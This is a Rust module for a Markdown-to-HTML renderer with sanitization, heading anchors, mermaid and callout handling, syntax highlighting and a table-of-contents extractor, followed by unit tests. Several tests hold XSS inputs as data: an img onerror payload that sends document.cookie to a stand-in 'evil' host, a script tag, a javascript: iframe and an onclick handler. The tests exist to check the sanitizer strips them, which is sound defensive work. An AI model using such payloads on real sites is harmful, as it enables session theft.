use ammonia::Builder;
use pulldown_cmark::{
    html, BlockQuoteKind, CodeBlockKind, Event, HeadingLevel, Options, Parser, Tag, TagEnd,
};
use serde::{Deserialize, Serialize};

/// Represents a heading in the document for table of contents.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct TocHeading {
    /// The heading text content.
    pub text: String,
    /// The heading level (1-6, corresponding to h1-h6).
    pub level: u8,
    /// Auto-generated ID for anchor links (slugified text).
    pub id: String,
}

/// Render a raw Markdown string to sanitized HTML with heading anchor IDs.
///
/// Supports GitHub Flavored Markdown (GFM) features: tables,
/// footnotes, strikethrough, task lists, and smart punctuation.
/// Automatically adds IDs to h2-h6 headings for anchor navigation.
pub fn render_markdown(raw: &str) -> String {
    let options = Options::ENABLE_TABLES
        | Options::ENABLE_FOOTNOTES
        | Options::ENABLE_STRIKETHROUGH
        | Options::ENABLE_TASKLISTS
        | Options::ENABLE_SMART_PUNCTUATION
        | Options::ENABLE_HEADING_ATTRIBUTES
        | Options::ENABLE_GFM;

    let parser = Parser::new_ext(raw, options);

    let mut in_mermaid = false;
    let transformed = parser.flat_map(|event| -> Vec<Event<'_>> {
        if in_mermaid {
            match event {
                Event::End(TagEnd::CodeBlock) => {
                    in_mermaid = false;
                    vec![Event::Html("</pre>".into())]
                }
                Event::Text(text) => vec![Event::Html(escape_html(&text).into())],
                _ => vec![],
            }
        } else {
            match event {
                Event::Start(Tag::CodeBlock(CodeBlockKind::Fenced(ref lang)))
                    if lang.as_ref() == "mermaid" =>
                {
                    in_mermaid = true;
                    vec![Event::Html("<pre class=\"mermaid\">".into())]
                }
                Event::Start(Tag::BlockQuote(Some(kind))) => {
                    let (class, title) = callout_meta(kind);
                    vec![Event::Html(
                        format!(
                            "<blockquote class=\"{class}\"><p class=\"callout-title\">{title}</p>"
                        )
                        .into(),
                    )]
                }
                Event::End(TagEnd::BlockQuote(Some(_))) => {
                    vec![Event::Html("</blockquote>".into())]
                }
                other => vec![other],
            }
        }
    });

    let mut html_output = String::new();
    html::push_html(&mut html_output, transformed);

    #[cfg(feature = "ssr")]
    let html_output = apply_syntax_highlighting(&html_output);

    // Post-process to add IDs to headings, then sanitize to strip any raw HTML from the source
    sanitize_html(&add_heading_ids_simple(&html_output))
}

/// Sanitize HTML to prevent XSS, while preserving safe GFM-generated attributes.
///
/// Extends ammonia's default allowlist with:
/// - `class` on `<pre>` and `<code>` (mermaid blocks and syntax highlighting)
/// - `id` on headings (anchor navigation)
/// - `id`/`name` on `<a>` (manual in-page anchor targets, e.g. `<a id="git_repo"></a>`)
/// - `<input>` with `type`/`disabled`/`checked` (GFM task list checkboxes)
fn sanitize_html(html: &str) -> String {
    Builder::default()
        .add_tag_attributes("pre", &["class", "data-cb-init"])
        .add_tag_attributes("code", &["class"])
        .add_tag_attributes("a", &["id", "name"])
        .add_tags(&["span"])
        .add_tag_attributes("span", &["class"])
        .add_tag_attributes("h1", &["id"])
        .add_tag_attributes("h2", &["id"])
        .add_tag_attributes("h3", &["id"])
        .add_tag_attributes("h4", &["id"])
        .add_tag_attributes("h5", &["id"])
        .add_tag_attributes("h6", &["id"])
        .add_tags(&["input"])
        .add_tag_attributes("input", &["type", "disabled", "checked"])
        .add_tag_attributes("blockquote", &["class"])
        .add_tag_attributes("p", &["class"])
        .clean(html)
        .to_string()
}

fn callout_meta(kind: BlockQuoteKind) -> (&'static str, &'static str) {
    match kind {
        BlockQuoteKind::Note => ("markdown-alert-note", "Note"),
        BlockQuoteKind::Tip => ("markdown-alert-tip", "Tip"),
        BlockQuoteKind::Important => ("markdown-alert-important", "Important"),
        BlockQuoteKind::Warning => ("markdown-alert-warning", "Warning"),
        BlockQuoteKind::Caution => ("markdown-alert-caution", "Caution"),
    }
}

fn escape_html(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
}

/// Simple post-processing to add IDs to heading tags.
fn add_heading_ids_simple(html: &str) -> String {
    // For h2-h6 tags, add id attribute based on text content
    let mut result = html.to_string();

    for level in 2..=6 {
        let pattern = format!("<h{}>", level);
        let closing = format!("</h{}>", level);

        let mut new_result = String::new();
        let mut last_end = 0;

        while let Some(start) = result[last_end..].find(&pattern) {
            let abs_start = last_end + start;
            let content_start = abs_start + pattern.len();

            // Find the closing tag
            if let Some(end_pos) = result[content_start..].find(&closing) {
                let abs_end = content_start + end_pos;
                let heading_text = &result[content_start..abs_end];

                // Strip any HTML tags from the heading text
                let clean_text = strip_html_tags(heading_text);
                let id = slugify(&clean_text);

                // Add everything up to this heading
                new_result.push_str(&result[last_end..abs_start]);
                // Add heading with ID
                new_result.push_str(&format!("<h{} id=\"{}\">", level, id));
                new_result.push_str(heading_text);
                new_result.push_str(&closing);

                last_end = abs_end + closing.len();
            } else {
                break;
            }
        }

        // Add the rest
        new_result.push_str(&result[last_end..]);
        result = new_result;
    }

    result
}

/// Strip HTML tags from text for ID generation.
fn strip_html_tags(text: &str) -> String {
    let mut result = String::new();
    let mut in_tag = false;

    for ch in text.chars() {
        match ch {
            '<' => in_tag = true,
            '>' => in_tag = false,
            _ if !in_tag => result.push(ch),
            _ => {}
        }
    }

    result.trim().to_string()
}

/// Extract headings from markdown content for building a table of contents.
///
/// Returns a vector of headings with their text, level (1-6), and generated ID.
/// Only includes h2 and h3 headings by default, as h1 is typically the page title.
pub fn extract_headings(raw: &str) -> Vec<TocHeading> {
    let options = Options::ENABLE_TABLES
        | Options::ENABLE_FOOTNOTES
        | Options::ENABLE_STRIKETHROUGH
        | Options::ENABLE_TASKLISTS
        | Options::ENABLE_SMART_PUNCTUATION;

    let parser = Parser::new_ext(raw, options);
    let mut headings = Vec::new();
    let mut current_heading: Option<(HeadingLevel, String)> = None;

    for event in parser {
        match event {
            Event::Start(Tag::Heading { level, .. }) => {
                current_heading = Some((level, String::new()));
            }
            Event::End(TagEnd::Heading(_level)) => {
                if let Some((h_level, text)) = current_heading.take() {
                    let level_num = match h_level {
                        HeadingLevel::H1 => 1,
                        HeadingLevel::H2 => 2,
                        HeadingLevel::H3 => 3,
                        HeadingLevel::H4 => 4,
                        HeadingLevel::H5 => 5,
                        HeadingLevel::H6 => 6,
                    };

                    // Only include h2 and h3 for TOC (h1 is typically the page title)
                    if (2..=3).contains(&level_num) {
                        let id = slugify(&text);
                        headings.push(TocHeading {
                            text,
                            level: level_num,
                            id,
                        });
                    }
                }
            }
            Event::Text(text) => {
                if let Some((_, ref mut heading_text)) = current_heading {
                    heading_text.push_str(&text);
                }
            }
            Event::Code(code) => {
                if let Some((_, ref mut heading_text)) = current_heading {
                    heading_text.push_str(&code);
                }
            }
            _ => {}
        }
    }

    headings
}

/// Convert text to a URL-safe slug for anchor IDs.
fn slugify(text: &str) -> String {
    text.to_lowercase()
        .chars()
        .map(|c| {
            if c.is_alphanumeric() {
                c
            } else {
                '-' // Convert all non-alphanumeric chars to dash
            }
        })
        .collect::<String>()
        .split('-')
        .filter(|s| !s.is_empty())
        .collect::<Vec<_>>()
        .join("-")
}

#[cfg(feature = "ssr")]
fn decode_html_entities(s: &str) -> String {
    s.replace("&amp;", "&")
        .replace("&lt;", "<")
        .replace("&gt;", ">")
        .replace("&quot;", "\"")
        .replace("&#39;", "'")
        .replace("&#x27;", "'")
}

/// Post-process rendered HTML to apply server-side syntax highlighting to fenced code blocks.
///
/// Finds `<pre><code class="language-LANG">...</code></pre>` patterns,
/// decodes HTML entities, runs syntect's `ClassedHTMLGenerator`, then re-emits
/// the block with highlighted `<span class="...">` tokens.  Unknown languages
/// are left untouched.
#[cfg(feature = "ssr")]
fn apply_syntax_highlighting(html: &str) -> String {
    use std::sync::OnceLock;
    use syntect::html::{ClassStyle, ClassedHTMLGenerator};
    use syntect::parsing::SyntaxSet;
    use syntect::util::LinesWithEndings;

    static SS: OnceLock<SyntaxSet> = OnceLock::new();
    let ss = SS.get_or_init(SyntaxSet::load_defaults_newlines);

    const NEEDLE: &str = "<pre><code class=\"language-";

    let mut result = String::with_capacity(html.len() + html.len() / 4);
    let mut pos = 0;

    while pos < html.len() {
        match html[pos..].find(NEEDLE) {
            None => {
                result.push_str(&html[pos..]);
                break;
            }
            Some(rel) => {
                let abs = pos + rel;
                result.push_str(&html[pos..abs]);

                let after_needle = abs + NEEDLE.len();

                // Extract language name (up to closing quote)
                let Some(lang_end) = html[after_needle..].find('"') else {
                    result.push_str(NEEDLE);
                    pos = abs + NEEDLE.len();
                    continue;
                };
                let lang = &html[after_needle..after_needle + lang_end];

                // Content starts after `">`
                let content_start = after_needle + lang_end + 2;
                let Some(code_end_rel) = html[content_start..].find("</code></pre>") else {
                    result.push_str(NEEDLE);
                    pos = abs + NEEDLE.len();
                    continue;
                };
                let content_end = content_start + code_end_rel;
                let encoded = &html[content_start..content_end];
                pos = content_end + "</code></pre>".len();

                result.push_str("<pre><code class=\"language-");
                result.push_str(lang);
                result.push_str("\">");

                let syntax = ss
                    .find_syntax_by_token(lang)
                    .or_else(|| ss.find_syntax_by_extension(lang));

                match syntax {
                    Some(syntax) => {
                        let code = decode_html_entities(encoded);
                        // SpacedPrefixed avoids collisions with Tailwind utility
                        // classes like `.block`, `.meta`, `.storage`, etc.
                        let mut gen = ClassedHTMLGenerator::new_with_class_style(
                            syntax,
                            ss,
                            ClassStyle::SpacedPrefixed { prefix: "hl-" },
                        );
                        for line in LinesWithEndings::from(&code) {
                            let _ = gen.parse_html_for_line_which_includes_newline(line);
                        }
                        result.push_str(&gen.finalize());
                    }
                    None => result.push_str(encoded),
                }

                result.push_str("</code></pre>");
            }
        }
    }

    result
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_basic_paragraph() {
        let result = render_markdown("Hello, world!");
        assert_eq!(result.trim(), "<p>Hello, world!</p>");
    }

    #[test]
    fn test_heading() {
        let result = render_markdown("# Title");
        assert_eq!(result.trim(), "<h1>Title</h1>");
    }

    #[test]
    fn test_bold_and_italic() {
        let result = render_markdown("**bold** and *italic*");
        assert!(result.contains("<strong>bold</strong>"));
        assert!(result.contains("<em>italic</em>"));
    }

    #[test]
    fn test_code_block() {
        let input = "```rust\nfn main() {}\n```";
        let result = render_markdown(input);
        assert!(result.contains("<code"));
        // syntect wraps tokens in separate spans, so "fn main()" is not a contiguous string
        assert!(result.contains("fn") && result.contains("main"));
    }

    #[test]
    fn test_unordered_list() {
        let input = "- item 1\n- item 2\n- item 3";
        let result = render_markdown(input);
        assert!(result.contains("<ul>"));
        assert!(result.contains("<li>item 1</li>"));
    }

    #[test]
    fn test_table() {
        let input = "| A | B |\n|---|---|\n| 1 | 2 |";
        let result = render_markdown(input);
        assert!(result.contains("<table>"));
        assert!(result.contains("<td>1</td>"));
    }

    #[test]
    fn test_strikethrough() {
        let result = render_markdown("~~deleted~~");
        assert!(result.contains("<del>deleted</del>"));
    }

    #[test]
    fn test_task_list() {
        let input = "- [x] done\n- [ ] not done";
        let result = render_markdown(input);
        assert!(result.contains("type=\"checkbox\""));
        assert!(result.contains("done"));
    }

    #[test]
    fn test_links() {
        let result = render_markdown("[Lekton](https://example.com)");
        // ammonia adds rel="noopener noreferrer" to external links
        assert!(result.contains("href=\"https://example.com\""));
        assert!(result.contains("Lekton"));
    }

    #[test]
    fn test_manual_anchor_target_preserved() {
        // Authors use empty anchors as in-page link targets; the id must survive
        // sanitization so `[x](#git_repo)` links resolve.
        let result = render_markdown("<a id=\"git_repo\"></a>\n\ntext");
        assert!(
            result.contains("id=\"git_repo\""),
            "anchor id must be preserved, got: {result}"
        );
    }

    #[test]
    fn test_anchor_keeps_no_dangerous_attributes() {
        // Allowing id/name on <a> must not let event handlers through.
        let result = render_markdown("<a id=\"x\" onclick=\"alert(1)\">link</a>");
        assert!(result.contains("id=\"x\""));
        assert!(
            !result.contains("onclick"),
            "onclick must be stripped: {result}"
        );
    }

    #[test]
    fn test_xss_raw_html_stripped() {
        let input =
            "safe text\n<img src=x onerror=\"fetch('//evil/'+document.cookie)\">\nmore text";
        let result = render_markdown(input);
        assert!(
            !result.contains("onerror"),
            "onerror handler must be stripped"
        );
        assert!(
            !result.contains("document.cookie"),
            "JS payload must be stripped"
        );
    }

    #[test]
    fn test_xss_script_tag_stripped() {
        let input = "text\n<script>alert('xss')</script>\nmore";
        let result = render_markdown(input);
        assert!(!result.contains("<script>"), "script tag must be stripped");
        assert!(!result.contains("alert"), "script content must be stripped");
    }

    #[test]
    fn test_xss_iframe_stripped() {
        let input = "text\n<iframe src=\"javascript:alert(1)\"></iframe>\nmore";
        let result = render_markdown(input);
        assert!(!result.contains("<iframe"), "iframe must be stripped");
    }

    #[test]
    fn test_empty_input() {
        let result = render_markdown("");
        assert_eq!(result, "");
    }

    #[test]
    fn test_multiline_document() {
        let input = r#"# Getting Started

Welcome to **Lekton**.

## Installation

```bash
cargo install lekton
```

- Fast
- Secure
- Dynamic
"#;
        let result = render_markdown(input);
        assert!(result.contains("<h1>Getting Started</h1>"));
        // h2 and above now have IDs
        assert!(result.contains("<h2 id=\"installation\">Installation</h2>"));
        assert!(result.contains("<strong>Lekton</strong>"));
        assert!(result.contains("<li>Fast</li>"));
    }

    #[test]
    fn test_heading_ids_added() {
        let input = "## Hello World\n\n### Using Code";
        let result = render_markdown(input);
        assert!(result.contains("<h2 id=\"hello-world\">Hello World</h2>"));
        assert!(result.contains("<h3 id=\"using-code\">Using Code</h3>"));
    }

    #[test]
    fn test_extract_headings_basic() {
        let input = r#"# Main Title

## Section One

Some content here.

## Section Two

### Subsection 2.1

More content.

### Subsection 2.2

Even more content.

## Section Three
"#;
        let headings = extract_headings(input);

        assert_eq!(headings.len(), 5);
        assert_eq!(headings[0].text, "Section One");
        assert_eq!(headings[0].level, 2);
        assert_eq!(headings[0].id, "section-one");

        assert_eq!(headings[1].text, "Section Two");
        assert_eq!(headings[1].level, 2);

        assert_eq!(headings[2].text, "Subsection 2.1");
        assert_eq!(headings[2].level, 3);
        assert_eq!(headings[2].id, "subsection-2-1");

        assert_eq!(headings[3].text, "Subsection 2.2");
        assert_eq!(headings[3].level, 3);
    }

    #[test]
    fn test_extract_headings_with_code() {
        let input = "## Using `cargo run`\n\n### The `main` function";
        let headings = extract_headings(input);

        assert_eq!(headings.len(), 2);
        assert_eq!(headings[0].text, "Using cargo run");
        assert_eq!(headings[1].text, "The main function");
    }

    #[test]
    fn test_extract_headings_empty() {
        let input = "Just some text without any headings.";
        let headings = extract_headings(input);
        assert_eq!(headings.len(), 0);
    }

    #[test]
    fn test_extract_headings_h1_excluded() {
        let input = "# Title\n\n## Subtitle";
        let headings = extract_headings(input);

        // H1 should be excluded from TOC
        assert_eq!(headings.len(), 1);
        assert_eq!(headings[0].text, "Subtitle");
        assert_eq!(headings[0].level, 2);
    }

    #[test]
    fn test_mermaid_block_rendered_as_pre() {
        let input = "```mermaid\ngraph TD\nA --> B\n```";
        let result = render_markdown(input);
        assert!(result.contains("<pre class=\"mermaid\">"));
        assert!(result.contains("graph TD"));
        assert!(!result.contains("<code"));
    }

    #[test]
    fn test_mermaid_html_escaped() {
        let input = "```mermaid\ngraph TD\nA[\"<node>\"] --> B\n```";
        let result = render_markdown(input);
        assert!(result.contains("&lt;node&gt;"));
        assert!(!result.contains("<node>"));
    }

    #[test]
    fn test_non_mermaid_code_block_unchanged() {
        let input = "```rust\nfn main() {}\n```";
        let result = render_markdown(input);
        assert!(result.contains("<code"));
        assert!(!result.contains("class=\"mermaid\""));
    }

    #[test]
    fn test_code_block_indentation_preserved() {
        let input = "```python\ndef foo():\n    x = 1\n    return x\n```";
        let result = render_markdown(input);
        // syntect wraps tokens in spans; indentation is bare text between spans,
        // so "    x" won't be contiguous — check the spaces and token separately
        assert!(
            result.contains("\n    "),
            "4-space indent newlines must be present"
        );
        assert!(result.contains("return") && result.contains("x"));
    }

    #[test]
    fn test_code_block_no_extra_newlines() {
        // Reproduces the bug where syntect splits single-line use statements
        // with braces across multiple lines.
        let code = concat!(
            "use coral::application::builder::CoralAppBuilder;\n",
            "use coral::http::application::{CoralHttpAppBuilder, ServiceConfig};\n",
            "async fn main() -> anyhow::Result<()> {\n",
            "    let startup: UsvcStartupData<CoralConfig> = load_startup_data!(?;\n",
            "    let app = CoralAppBuilder {\n",
            "        http: CoralHttpAppBuilder::default()\n",
            "            .with_configurator(|_cfg: &mut ServiceConfig| { /* services */ }),\n",
            "    };\n",
            "}\n",
        );
        let input = format!("```rust\n{code}```");
        let result = render_markdown(&input);
        println!("LONG OUTPUT:\n{result}");
        // Each use statement must stay on one line
        assert!(
            !result.contains("::\n"),
            "found unexpected newline after `::` — brace group is being split"
        );
        // The closure body must stay on one line
        assert!(
            result.contains("services"),
            "comment content must be preserved"
        );
    }

    #[test]
    fn test_callout_note() {
        let input = "> [!NOTE]\n> Useful information.";
        let result = render_markdown(input);
        assert!(result.contains("markdown-alert-note"), "got: {result}");
        assert!(result.contains("callout-title"), "got: {result}");
        assert!(result.contains("Note"), "got: {result}");
        assert!(result.contains("Useful information"), "got: {result}");
    }

    #[test]
    fn test_callout_all_types() {
        for (kind, class, title) in [
            ("NOTE", "markdown-alert-note", "Note"),
            ("TIP", "markdown-alert-tip", "Tip"),
            ("IMPORTANT", "markdown-alert-important", "Important"),
            ("WARNING", "markdown-alert-warning", "Warning"),
            ("CAUTION", "markdown-alert-caution", "Caution"),
        ] {
            let input = format!("> [!{kind}]\n> Content.");
            let result = render_markdown(&input);
            assert!(
                result.contains(class),
                "{kind}: expected class {class}, got: {result}"
            );
            assert!(
                result.contains(title),
                "{kind}: expected title {title}, got: {result}"
            );
        }
    }

    #[test]
    fn test_regular_blockquote_unaffected() {
        let result = render_markdown("> just a regular quote");
        assert!(result.contains("<blockquote>"), "got: {result}");
        assert!(!result.contains("markdown-alert"), "got: {result}");
    }

    #[test]
    fn test_slugify() {
        assert_eq!(slugify("Hello World"), "hello-world");
        assert_eq!(slugify("API Reference"), "api-reference");
        assert_eq!(slugify("Getting Started!"), "getting-started");
        assert_eq!(slugify("Using `cargo`"), "using-cargo");
        assert_eq!(slugify("Section 2.1"), "section-2-1");
    }
}
